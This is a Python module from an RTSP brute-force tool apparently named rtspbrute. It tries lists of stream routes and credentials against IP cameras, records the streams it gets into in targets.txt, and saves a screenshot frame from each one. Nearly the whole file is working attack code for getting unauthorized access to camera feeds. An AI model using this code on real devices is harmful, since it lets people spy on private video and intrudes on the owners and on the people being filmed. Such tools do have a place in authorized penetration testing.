import logging
from pathlib import Path
from typing import List
import re

import av

from rtspbrute.modules.cli.output import console
from rtspbrute.modules.rtsp import RTSPClient, Status
from rtspbrute.modules.utils import escape_chars

ROUTES: List[str]
CREDENTIALS: List[str]
PORTS: List[int]
PICS_FOLDER: Path

DUMMY_ROUTE = "/0x8b6c42"

# 401, 403: credentials are wrong but the route might be okay.
# 404: route is incorrect but the credentials might be okay.
# 200: stream is accessed successfully.
ROUTE_OK_CODES = [
    "RTSP/1.0 200",
    "RTSP/1.0 401",
    "RTSP/1.0 403",
    "RTSP/2.0 200",
    "RTSP/2.0 401",
    "RTSP/2.0 403",
]
CREDENTIALS_OK_CODES = ["RTSP/1.0 200", "RTSP/1.0 404", "RTSP/2.0 200", "RTSP/2.0 404"]

logger = logging.getLogger()
logger_is_enabled = logger.isEnabledFor(logging.DEBUG)


def attack(target: RTSPClient, port=None, route=None, credentials=None):
    if port is None:
        port = target.port
    if route is None:
        route = target.route
    if credentials is None:
        credentials = target.credentials

    # Create socket connection.
    connected = target.connect(port)
    if not connected:
        if logger_is_enabled:
            exc_info = (
                target.last_error if target.status is Status.UNIDENTIFIED else None
            )
            logger.debug(f"Failed to connect {target}:", exc_info=exc_info)
        return False

    # Try to authorize: create describe packet and send it.
    authorized = target.authorize(port, route, credentials)
    if logger_is_enabled:
        request = "\n\t".join(target.packet.split("\r\n")).rstrip()
        if target.data:
            response = "\n\t".join(target.data.split("\r\n")).rstrip()
        else:
            response = ""
        logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
    if not authorized:
        if logger_is_enabled:
            attack_url = RTSPClient.get_rtsp_url(target.ip, port, credentials, route)
            exc_info = (
                target.last_error if target.status is Status.UNIDENTIFIED else None
            )
            logger.debug(f"Failed to authorize {attack_url}", exc_info=exc_info)
        return False

    return True


def attack_route(target: RTSPClient):
    # If the stream responds positively to the dummy route, it means
    # it doesn't require (or respect the RFC) a route and the attack
    # can be skipped.
    for port in PORTS:
        ok = attack(target, port=port, route=DUMMY_ROUTE)
        if ok and any(code in target.data for code in ROUTE_OK_CODES):
            target.port = port
            target.routes.append("/")
            return target

        # Otherwise, bruteforce the routes.
        for route in ROUTES:
            ok = attack(target, port=port, route=route)
            if not ok:
                break
            if any(code in target.data for code in ROUTE_OK_CODES):
                target.port = port
                target.routes.append(route)
                return target


def attack_credentials(target: RTSPClient):
    def _log_working_stream():
        console.print("Working stream at", target)
        
        # Save target to a file
        with open('targets.txt', 'a') as f:
            f.write(str(target) + '\n')
        
        if logger_is_enabled:
            logger.debug(
                f"Working stream at {target} with {target.auth_method.name} auth"
            )

    if target.is_authorized:
        _log_working_stream()
        return target

    # If stream responds positively to no credentials, it means
    # it doesn't require them and the attack can be skipped.
    ok = attack(target, credentials=":")
    if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
        _log_working_stream()
        return target

    # Otherwise, bruteforce the routes.
    for cred in CREDENTIALS:
        ok = attack(target, credentials=cred)
        if not ok:
            break
        if any(code in target.data for code in CREDENTIALS_OK_CODES):
            target.credentials = cred
            _log_working_stream()
            return target


def _is_video_stream(stream):
    return (
            stream.profile is not None
            and stream.start_time is not None
            and stream.codec_context.format is not None
    )


def get_screenshot(rtsp_url: str):
    try:
        with av.open(
                rtsp_url,
                timeout=30.0,
        ) as container:
            stream = container.streams.video[0]
            if _is_video_stream(stream):
                file_name = escape_chars(f"{rtsp_url.lstrip('rtsp://')}.jpg")
                file_path = PICS_FOLDER / file_name
                stream.thread_type = "AUTO"
                for frame in container.decode(video=0):
                    frame.to_image().save(file_path)
                    break
                console.print(
                    f"[bold]Captured screenshot for",
                    f"[underline cyan]{rtsp_url}",
                )
                if logger_is_enabled:
                    logger.debug(f"Captured screenshot for {rtsp_url}")
                return file_path

    except Exception as e:
        pass
        # use a regular expression to match the error message "Server returned 401 Unauthorized"
        #match = re.search("Server returned 401 Unauthorized", str(e))
        #if match:
        #    # extract the IP address from the rtsp_url string using a regular expression
        #    ip_match = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", rtsp_url)
        #    ip_address = ip_match.group()
        #    # print the error message
        #    console.print(
        #        f"[bold]Screenshot failed, but saved IP to file for",
        #        f"[underline red]{rtsp_url}: {repr(e)}",
        #    )
        #    # save the IP address to an existing file, creates file if it doesn't exist
        #    with open("unauthorized_ips.txt", "a") as f:
        #        f.write(ip_address + "\n")
